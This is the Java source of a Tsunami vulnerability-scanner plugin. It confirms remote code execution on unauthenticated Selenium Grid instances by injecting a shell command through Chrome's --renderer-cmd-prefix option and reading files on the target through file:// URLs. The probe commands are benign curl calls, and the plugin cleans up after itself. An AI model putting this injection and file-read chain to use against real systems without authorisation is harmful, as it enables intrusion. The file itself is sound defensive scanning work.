/*
 * Copyright 2023 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package com.google.tsunami.plugins.detectors.rce.selenium;

import static com.google.common.base.Preconditions.checkNotNull;
import static com.google.common.collect.ImmutableList.toImmutableList;
import static com.google.common.net.HttpHeaders.CONTENT_TYPE;
import static com.google.tsunami.common.data.NetworkEndpointUtils.toUriAuthority;
import static com.google.tsunami.common.net.http.HttpRequest.get;
import static java.nio.charset.StandardCharsets.UTF_8;

import com.google.common.annotations.VisibleForTesting;
import com.google.common.collect.ImmutableList;
import com.google.common.flogger.GoogleLogger;
import com.google.common.io.Resources;
import com.google.gson.JsonObject;
import com.google.gson.JsonPrimitive;
import com.google.gson.JsonSyntaxException;
import com.google.protobuf.ByteString;
import com.google.protobuf.util.Timestamps;
import com.google.tsunami.common.data.NetworkServiceUtils;
import com.google.tsunami.common.net.http.HttpClient;
import com.google.tsunami.common.net.http.HttpHeaders;
import com.google.tsunami.common.net.http.HttpRequest;
import com.google.tsunami.common.net.http.HttpResponse;
import com.google.tsunami.common.time.UtcClock;
import com.google.tsunami.plugin.PluginType;
import com.google.tsunami.plugin.VulnDetector;
import com.google.tsunami.plugin.annotations.PluginInfo;
import com.google.tsunami.plugin.payload.Payload;
import com.google.tsunami.plugin.payload.PayloadGenerator;
import com.google.tsunami.proto.DetectionReport;
import com.google.tsunami.proto.DetectionReportList;
import com.google.tsunami.proto.DetectionStatus;
import com.google.tsunami.proto.NetworkService;
import com.google.tsunami.proto.PayloadGeneratorConfig;
import com.google.tsunami.proto.Severity;
import com.google.tsunami.proto.TargetInfo;
import com.google.tsunami.proto.Vulnerability;
import com.google.tsunami.proto.VulnerabilityId;
import java.io.IOException;
import java.time.Clock;
import java.time.Duration;
import java.time.Instant;
import javax.inject.Inject;

/** A Tsunami plugin that detects RCE via exposed Selenium Grid */
@PluginInfo(
    type = PluginType.VULN_DETECTION,
    name = "RCEViaExposedSeleniumGridDetector",
    version = "0.1",
    description = "This plugin detects RCE in Selenium Grid service via Chrome webdriver.",
    author = "Dawid Golunski (dawid@doyensec.com)",
    bootstrapModule = RCEViaExposedSeleniumGridDetectorBootstrapModule.class)
public final class RCEViaExposedSeleniumGridDetector implements VulnDetector {
  @VisibleForTesting static final String VULNERABILITY_REPORT_PUBLISHER = "TSUNAMI_COMMUNITY";

  @VisibleForTesting
  static final String VULNERABILITY_REPORT_ID = "RCEViaExposedSeleniumGridDetector";

  @VisibleForTesting
  static final String VULNERABILITY_REPORT_TITLE =
      "Selenium Grid - Remote Code Execution via Chrome webdriver";

  @VisibleForTesting
  static final String VULNERABILITY_REPORT_DESCRIPTION =
      "The scanner detected an exposed Selenium Grid service that allows annonymous access."
          + " It is possible to connect to Selenium Grid to create a remote Chrome webdriver"
          + " with a set of configurations such as --renderer-cmd-prefix which can allow attackers"
          + " to inject an arbitrary command that will get executed when a browser is started.";

  @VisibleForTesting
  static final String VULNERABILITY_REPORT_RECOMMENDATION =
      "Restrict access to the exposed Selenium Grid by adding --username and --password parameters"
          + " to selenium-server.jar command line, or within the [router] section in"
          + " the Selenium Grid config file (/opt/selenium/config.toml).\n"
          + "See: https://www.selenium.dev/documentation/grid/configuration/cli_options/#router";

  private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();

  private final Clock utcClock;
  private final HttpClient httpClient;
  private final PayloadGenerator payloadGenerator;
  private final String payloadFormatString;
  private final String seleniumUrlPayload;
  private final String seleniumSessionSettings;
  private static final String SELENIUM_GRID_SERVICE_PATH = "wd/hub";
  private static final String RCE_TEST_FILE_PATH = "/tmp/tsunami-selenium-rce";

  @VisibleForTesting
  static final String RCE_TEST_STRING =
      "tsunami-selenium-rce-" + Long.toHexString(Double.doubleToLongBits(Math.random()));

  // Selenium Grid ready state wait timeout. It's set to 310s (~5min) here.
  // Default Selenium Grid in uses 300s timeouts so it should be more than this.
  private static final int POLLING_RATE = 10000; // 10s
  private static final int POLLING_ATTEMPTS = 31;

  // Tsunami scanner relies heavily on Guice framework. So all the utility dependencies of your
  // plugin must be injected through the constructor of the detector. Notably, the Payload
  // generator is injected this way.
  @Inject
  RCEViaExposedSeleniumGridDetector(
      @UtcClock Clock utcClock, HttpClient httpClient, PayloadGenerator payloadGenerator)
      throws IOException {
    this.utcClock = checkNotNull(utcClock);
    // TODO: setReadTimeout() method is missing in Tsunami HttpClient.java.
    // It is needed to avoid false negatives. See TODO(b/145315535) in tsunami-scanner
    // Enable the line below once this bug has been fixed.
    // this.httpClient = httpClient.modify().setReadTimeout(Duration.ofSeconds(15)).build();
    this.httpClient = httpClient.modify().setConnectTimeout(Duration.ofSeconds(10)).build();
    this.payloadGenerator = checkNotNull(payloadGenerator);

    this.payloadFormatString =
        String.format(
            Resources.toString(
                Resources.getResource(this.getClass(), "payloadFormatString.json"), UTF_8),
            "%s"); // Placeholder for the command payload

    this.seleniumSessionSettings =
        Resources.toString(
            Resources.getResource(this.getClass(), "payloadSessionSettings.json"), UTF_8);

    this.seleniumUrlPayload =
        String.format(
            Resources.toString(
                Resources.getResource(this.getClass(), "payloadSeleniumUrl.json"), UTF_8),
            "%s"); // Placeholder for URL
  }

  // This is the main entry point of VulnDetector.
  @Override
  public DetectionReportList detect(
      TargetInfo targetInfo, ImmutableList<NetworkService> matchedServices) {
    logger.atInfo().log("RCEViaExposedSeleniumGridDetector starts detecting.");

    return DetectionReportList.newBuilder()
        .addAllDetectionReports(
            matchedServices.stream()
                .filter(NetworkServiceUtils::isWebService)
                .filter(this::isSeleniumGridExposed)
                .filter(this::isServiceVulnerable)
                // Build DetectionReport message for vulnerable services.
                .map(networkService -> buildDetectionReport(targetInfo, networkService))
                .collect(toImmutableList()))
        .build();
  }

  private boolean isServiceVulnerable(NetworkService networkService) {
    // Ensure Selenium is in ready state and accepts new requests before continuing with RCE
    if (!isSeleniumGridReady(networkService)) {
      logger.atInfo().log("Selenium Grid is not in ready state");
      return false;
    }

    // Check for RCE
    logger.atInfo().log("Found exposed Selenium Grid. Checking for RCE via Chrome driver.");

    // Tell the PayloadGenerator what kind of vulnerability we are detecting
    PayloadGeneratorConfig config =
        PayloadGeneratorConfig.newBuilder()
            .setVulnerabilityType(PayloadGeneratorConfig.VulnerabilityType.REFLECTIVE_RCE)
            .setInterpretationEnvironment(
                PayloadGeneratorConfig.InterpretationEnvironment.LINUX_SHELL)
            .setExecutionEnvironment(
                PayloadGeneratorConfig.ExecutionEnvironment.EXEC_INTERPRETATION_ENVIRONMENT)
            .build();
    // Pass in the config to get the actual payload from the generator.
    // If the Tsunami callback server is configured, the generator will always try to return a
    // callback-enabled payload.
    Payload payload = this.payloadGenerator.generate(config);
    String commandToInject = payload.getPayload();

    // Confirm RCE with the callback server if available
    if (payload.getPayloadAttributes().getUsesCallbackServer()) {
      var unused = executeCommandViaChrome(networkService, commandToInject);
      logger.atInfo().log("Confirming Selenium Grid RCE with the callback server");
      return payload.checkIfExecuted();
    }

    // Use an alternative approach if the callback server is not available.
    logger.atInfo().log("Callback server disabled. Confirming RCE with an alternative method.");

    // Execute curl command to create a test file in /tmp with a detection string.
    // curl will write the string into the trace log as result of a DNS resolution error.
    // Example trace log contents:
    // == Info: Could not resolve host: tsunami-selenium-rce-executed
    commandToInject = String.format("curl --trace %s %s", RCE_TEST_FILE_PATH, RCE_TEST_STRING);
    var unused = executeCommandViaChrome(networkService, commandToInject);

    // Check if the RCE test file got created and contains our RCE test string/needle
    String rceTestFileContents;
    rceTestFileContents = readFileViaSelenium(networkService, RCE_TEST_FILE_PATH);

    if (rceTestFileContents != null && rceTestFileContents.contains(RCE_TEST_STRING)) {
      // Vulnerable
      logger.atInfo().log(
          "RCE Payload executed! File %s exists and contains %s string!",
          RCE_TEST_FILE_PATH, RCE_TEST_STRING);

      // Cleanup
      // Use curl to truncate the file by reading /dev/null. Using rm would risk removing the
      // /usr/bin/chrome file as the injected command gets prepended before path/arguments.
      logger.atInfo().log("Cleaning up created RCE test file.");
      commandToInject = String.format("curl -o %s file:///dev/null", RCE_TEST_FILE_PATH);
      unused = executeCommandViaChrome(networkService, commandToInject);
      return true;

    } else {
      // Not vulnerable
      logger.atInfo().log(
          "File %s doesn't exist, or doesn't contain %s string",
          RCE_TEST_FILE_PATH, RCE_TEST_STRING);
      return false;
    }
  }

  private static String buildTargetUrl(NetworkService networkService, String path) {
    StringBuilder targetUrlBuilder = new StringBuilder();

    if (NetworkServiceUtils.isWebService(networkService)) {
      targetUrlBuilder.append(NetworkServiceUtils.buildWebApplicationRootUrl(networkService));

    } else {
      // Default to HTTP protocol when the scanner cannot identify the actual service.
      // HTTP is also used in a default Selenium Grid install.
      targetUrlBuilder
          .append("http://")
          .append(toUriAuthority(networkService.getNetworkEndpoint()))
          .append("/");
    }
    targetUrlBuilder.append(path);
    return targetUrlBuilder.toString();
  }

  // Verifies that Selenium Grid is exposed.
  // Password-protected Selenium Grid will issue a 401 Unauthorized response with header:
  // WWW-Authenticate: Basic realm="selenium-server"
  private boolean isSeleniumGridExposed(NetworkService networkService) {
    String statusUri = buildTargetUrl(networkService, SELENIUM_GRID_SERVICE_PATH + "/status");

    try {
      HttpResponse response =
          httpClient.send(get(statusUri).withEmptyHeaders().build(), networkService);
      return (response.status().isSuccess()
          && response.bodyString().map(body -> body.contains("Selenium Grid")).orElse(false));
    } catch (IOException e) {
      logger.atWarning().withCause(e).log("Request to target %s failed", statusUri);
    }

    return false;
  }

  // Ensures Selenium is in ready state and accepts new requests to avoid stuck requests.
  // Returns true when ready, or false on timeout or failure
  private boolean isSeleniumGridReady(NetworkService networkService) {
    boolean seleniumIsReady = false;
    String statusUri = buildTargetUrl(networkService, SELENIUM_GRID_SERVICE_PATH + "/status");

    logger.atInfo().log(
        "Waiting for Selenium Grid to enter ready state (timeout is %d s)",
        (POLLING_RATE * POLLING_ATTEMPTS / 1000));
    int attempts = 0;

    // Request Selenium Grid ready status until true, or the number of attempts get exhausted
    while (true) {
      attempts++;
      if (attempts > POLLING_ATTEMPTS) {
        logger.atWarning().log("Timeout while waiting for Selenium to become ready");
        return false;
      }

      try {
        HttpResponse response =
            httpClient.send(get(statusUri).withEmptyHeaders().build(), networkService);

        if (response.status().isSuccess() && response.bodyJson().isPresent()) {
          JsonObject jsonResponse = (JsonObject) response.bodyJson().get();
          JsonObject value = (JsonObject) jsonResponse.get("value");
          JsonPrimitive readyPrimitive = value.getAsJsonPrimitive("ready");
          if (readyPrimitive != null) {
            seleniumIsReady = readyPrimitive.getAsBoolean();
            if (seleniumIsReady) {
              return true;
            }
          }

        } else {
          logger.atInfo().log("Invalid Selenium Grid response.");
          return false;
        }

      } catch (JsonSyntaxException | IOException | AssertionError e) {
        logger.atWarning().withCause(e).log("Request to target %s failed", statusUri);
        return false;
      }

      // Sleep
      try {
        Thread.sleep(POLLING_RATE);

      } catch (InterruptedException e) {
        logger.atWarning().log("Failed to wait for Selenium ready state");
        return false;
      }
    }
  }

  // Injects RCE command with --renderer-cmd-prefix Chrome browser parameter.
  // This prevents a normal chrome instance startup which should result in a "tab crashed" error.
  // Returns true if the injected command caused a tab crash (command likely executed).
  private boolean executeCommandViaChrome(NetworkService networkService, String command) {
    String targetUri = buildTargetUrl(networkService, SELENIUM_GRID_SERVICE_PATH + "/session");
    String reqPayload = String.format(payloadFormatString, command);
    boolean hasTabCrashed;

    logger.atInfo().log("Executing command via Selenium: %s", command);
    HttpRequest req =
        HttpRequest.post(targetUri)
            .setHeaders(HttpHeaders.builder().addHeader(CONTENT_TYPE, "application/json").build())
            .setRequestBody(ByteString.copyFromUtf8(reqPayload))
            .build();
    try {
      HttpResponse response = httpClient.send(req, networkService);
      hasTabCrashed =
          (response.bodyString().map(body -> body.contains("tab crashed")).orElse(false));

    } catch (IOException e) {
      logger.atWarning().withCause(e).log("Request to target %s failed", targetUri);
      return false;
    }

    // Injected command in --renderer-cmd-prefix will prevent Chrome from starting up properly
    if (hasTabCrashed) {
      logger.atInfo().log("Chrome tab crashed, command likely executed.");
      return true;

    } else {
      return false;
    }
  }

  // Reads a file with file:// browser protocol.
  // Returns the contents of the file read, or null if not successful / not found.
  private String readFileViaSelenium(NetworkService networkService, String filePath) {
    // Get Selenium Session ID
    logger.atInfo().log("Creating a Selenium Grid session");
    String seleniumSessionId = createSeleniumSession(networkService);
    if (seleniumSessionId == null) {
      logger.atInfo().log("Failed to create a Selenium Grid session");
      return null;
    }

    // Request file to read via file:// protocol
    String targetUri =
        buildTargetUrl(
            networkService, SELENIUM_GRID_SERVICE_PATH + "/session/" + seleniumSessionId + "/url");
    String fileUri = "file://" + filePath;
    String fileReadPayload = String.format(seleniumUrlPayload, fileUri);
    boolean fileRequestSubmitted = false;

    logger.atInfo().log("Requesting %s URI via Selenium Grid", fileUri);
    HttpRequest req =
        HttpRequest.post(targetUri)
            .setHeaders(HttpHeaders.builder().addHeader(CONTENT_TYPE, "application/json").build())
            .setRequestBody(ByteString.copyFromUtf8(fileReadPayload))
            .build();
    try {
      HttpResponse response = httpClient.send(req, networkService);
      fileRequestSubmitted = response.status().isSuccess();

    } catch (IOException e) {
      logger.atWarning().withCause(e).log("Request to target %s failed", targetUri);
    }

    if (!fileRequestSubmitted) {
      logger.atInfo().log("Selenium request to the %s URI failed.", fileUri);
      var unused = closeSeleniumSession(networkService, seleniumSessionId);
      return null;
    }

    // Read file contents via Selenium browser source code handler
    targetUri =
        buildTargetUrl(
            networkService,
            SELENIUM_GRID_SERVICE_PATH + "/session/" + seleniumSessionId + "/source");
    String fileContents = null;

    req =
        HttpRequest.get(targetUri)
            .setHeaders(HttpHeaders.builder().addHeader(CONTENT_TYPE, "application/json").build())
            .build();

    logger.atInfo().log("Attempting to read RCE test file via %s", fileUri);
    try {
      HttpResponse response = httpClient.send(req, networkService);

      if (response.status().isSuccess() && response.bodyJson().isPresent()) {
        JsonObject jsonResponse = (JsonObject) response.bodyJson().get();
        JsonPrimitive value = jsonResponse.getAsJsonPrimitive("value");
        if (value != null) {
          fileContents = value.getAsString();
          // Response will contain ERR_FILE_NOT_FOUND if the file:// handler can't find the file
          if (fileContents.contains("ERR_FILE_NOT_FOUND")) {
            logger.atInfo().log(
                "Got ERR_FILE_NOT_FOUND. File %s was not found on the target", filePath);
            fileContents = null;
          }

        } else {
          logger.atInfo().log("Empty value field in JSON body.");
        }

      } else {
        logger.atInfo().log("Invalid JSON response to source request.");
      }
    } catch (JsonSyntaxException | IOException | AssertionError e) {
      logger.atWarning().withCause(e).log("Request to target %s failed", targetUri);
    }

    // Close previously created Selenium session and return the file contents
    var unused = closeSeleniumSession(networkService, seleniumSessionId);
    return fileContents;
  }

  // Opens a Selenium Grid session that is required to submit browser requests.
  // Returns session ID string, or null if not successful.
  private String createSeleniumSession(NetworkService networkService) {
    String targetUri = buildTargetUrl(networkService, SELENIUM_GRID_SERVICE_PATH + "/session");
    String seleniumSessionId = null;

    HttpRequest req =
        HttpRequest.post(targetUri)
            .setHeaders(HttpHeaders.builder().addHeader(CONTENT_TYPE, "application/json").build())
            .setRequestBody(ByteString.copyFromUtf8(seleniumSessionSettings))
            .build();

    try {
      HttpResponse response = httpClient.send(req, networkService);

      if (response.status().isSuccess() && response.bodyJson().isPresent()) {
        JsonObject jsonResponse = (JsonObject) response.bodyJson().get();
        JsonObject value = (JsonObject) jsonResponse.get("value");
        JsonPrimitive sessionPrimitive = value.getAsJsonPrimitive("sessionId");
        if (sessionPrimitive != null) {
          seleniumSessionId = sessionPrimitive.getAsString();
          logger.atInfo().log("Created a Selenium session with ID: %s.", seleniumSessionId);
          return seleniumSessionId;
        } else {
          logger.atInfo().log("Couldn't obtain Selenium session ID from JSON reply.");
        }

      } else {
        logger.atInfo().log("Invalid JSON reply. Couldn't establish a Selenium session.");
      }
    } catch (JsonSyntaxException | IOException | AssertionError e) {
      logger.atWarning().withCause(e).log("Request to target %s failed", targetUri);
    }

    return null;
  }

  // Close session. Returns true if successful
  private boolean closeSeleniumSession(NetworkService networkService, String seleniumSessionId) {
    logger.atInfo().log("Closing Selenium Session %s", seleniumSessionId);
    String targetUri =
        buildTargetUrl(
            networkService, SELENIUM_GRID_SERVICE_PATH + "/session/" + seleniumSessionId);
    HttpRequest req =
        HttpRequest.delete(targetUri)
            .setHeaders(HttpHeaders.builder().addHeader(CONTENT_TYPE, "application/json").build())
            .build();
    try {
      HttpResponse response = httpClient.send(req, networkService);
      if (!response.status().isSuccess()) {
        logger.atInfo().log("Failed to close Selenium Grid session %s", seleniumSessionId);
        return false;
      }

    } catch (IOException e) {
      logger.atWarning().withCause(e).log("Request to target %s failed", targetUri);
      return false;
    }

    return true;
  }

  // This builds the DetectionReport message for a specific vulnerable network service.
  private DetectionReport buildDetectionReport(
      TargetInfo targetInfo, NetworkService vulnerableNetworkService) {
    return DetectionReport.newBuilder()
        .setTargetInfo(targetInfo)
        .setNetworkService(vulnerableNetworkService)
        .setDetectionTimestamp(Timestamps.fromMillis(Instant.now(utcClock).toEpochMilli()))
        .setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
        .setVulnerability(
            Vulnerability.newBuilder()
                .setMainId(
                    VulnerabilityId.newBuilder()
                        .setPublisher(VULNERABILITY_REPORT_PUBLISHER)
                        .setValue(VULNERABILITY_REPORT_ID))
                .setSeverity(Severity.CRITICAL)
                .setTitle(VULNERABILITY_REPORT_TITLE)
                .setDescription(VULNERABILITY_REPORT_DESCRIPTION)
                .setRecommendation(VULNERABILITY_REPORT_RECOMMENDATION))
        .build();
  }
}
